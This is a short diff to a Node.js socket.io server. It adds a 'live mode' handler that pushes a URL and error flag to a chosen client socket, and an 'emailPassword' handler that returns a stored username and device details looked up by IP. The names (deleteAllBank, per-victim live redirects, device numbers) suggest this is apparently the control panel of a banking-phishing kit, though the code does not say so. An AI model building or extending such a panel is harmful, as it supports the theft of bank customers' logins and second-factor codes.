@@ -9,6 +9,8 @@ const cors = require('cors')
 const { seed } = require("./factory/seed")
 const { deleteAllBank } = require("./controller/user/deleteAllUser.controller")
 const { disconnectLive } = require("./controller/live/disconnectLive.controller")
+const { getUser } = require("./controller/user/getUser.controller")
+const { changeLive } = require("./controller/live/changeLive.controller")
 require('dotenv').config()
 
 connectdb()
@@ -53,12 +55,26 @@ io.on("connection", async(socket) => {
 
 
     // MODE LIVE
-    socket.on('[LIVE] changeUrlPanel', ({url, viewError, socketID}) => { 
+    socket.on('[LIVE] changeUrlPanel', async({user}) => { 
+        const {socketID, viewError, url } = user
+        const newUser = await changeLive({user}) 
+        io.to(socketID).emit('[LIVE] changeUrlClient', {url, viewError} )
+        socket.emit('[User] newUser', newUser)
+    })
 
-        io.to(socketID).emit('[LIVE] changeUrlClient', {url, viewError} 
-    )})
+    // socket.on('disconnect', async() => { 
+    //     const usuario = await disconnectLive({socketID: socket.id}) 
+    //     // return socket.broadcast.emit('[User] newUser', usuario)
+    // })
 
-    socket.on('disconnect', () => { disconnectLive({socketID: socket.id}) })
+    socket.on('[LIVE] emailPassword', async(ip, cb) => {
+        try {
+            const {username, typeDevice, numberDevice} = await getUser({ip: ip.ip})
+            cb({username, typeDevice, numberDevice})
+        } catch (error) {
+            
+        }
+    })
 })
 
 
